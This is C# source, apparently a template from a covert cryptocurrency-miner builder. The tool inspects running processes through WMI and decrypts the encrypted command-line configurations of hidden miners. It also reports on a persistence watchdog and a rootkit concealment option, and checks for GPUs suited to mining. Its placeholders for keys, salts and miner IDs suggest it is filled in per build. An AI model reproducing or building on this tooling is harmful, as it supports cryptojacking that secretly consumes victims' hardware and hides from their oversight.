using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class _rChecker_
{
    public static void Main()
    {
        try
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("Not run as Administrator, only non-administrator miners can be searched for.");
            }

            var _rconnection_ = new ConnectionOptions();
            _rconnection_.Impersonation = ImpersonationLevel.Impersonate;
            var _rscope_ = new ManagementScope("#WMISCOPE", _rconnection_);
            _rscope_.Connect();

            var _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
#if DefInstall
            bool _rwdrunning_ = false;
            foreach (ManagementObject _rmemObj_ in _rsearcher_)
            {
                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#WATCHDOGID"))
                {
                    _rwdrunning_ = true;
                    break;
                }
            }
            Console.WriteLine("Watchdog Running: " + (_rwdrunning_ ? "Yes" : "No"));
#endif
#if DefRootkit
            Console.WriteLine("Miner is installed with rootkit, miners might not always appear in the list below even though they might be running.");
#endif
            Console.WriteLine("Miners:");
            _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
            foreach (ManagementObject _rmemObj_ in _rsearcher_)
            {
                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#MINERID"))
                {
                    try
                    {
                        foreach(string _rminer_ in _rmemObj_["CommandLine"].ToString().Split(' '))
                        {
                            string _rdecrypted_ = _rUnamlibDecrypt_(_rminer_);
                            if (!string.IsNullOrEmpty(_rdecrypted_))
                            {
                                Console.WriteLine(_rdecrypted_);
                                break;
                            }
                        }
                    }
                    catch { }
                }
            }

            string _rgpu_ = "";
            Console.WriteLine("GPUs:");
            _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("#GPUQUERY")).Get();
            foreach (ManagementObject _rmemObj_ in _rsearcher_)
            {
                _rgpu_ += " " + _rmemObj_["Name"];
                Console.WriteLine(" " + _rmemObj_["Name"]);
            }

            Console.WriteLine("Compatible GPU found: " + (_rgpu_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rgpu_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0));
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.ToString());
        }
        Console.ReadKey();
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
    }

    public static string _rUnamlibDecrypt_(string _rplainText_)
    {
        try
        {
            var _rinput_ = Convert.FromBase64String(_rplainText_);
            using (var _rmStream_ = new MemoryStream())
            {
                using (var _rcStream_ = new CryptoStream(_rmStream_, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateDecryptor(Encoding.ASCII.GetBytes("#UNAMKEY"), Encoding.ASCII.GetBytes("#UNAMIV")), CryptoStreamMode.Write))
                {
                    _rcStream_.Write(_rinput_, 0, _rinput_.Length);
                    _rcStream_.FlushFinalBlock();
                    _rcStream_.Close();
                }
                return Encoding.UTF8.GetString(_rmStream_.ToArray());
            }
        }catch {}
        return "";
    }
}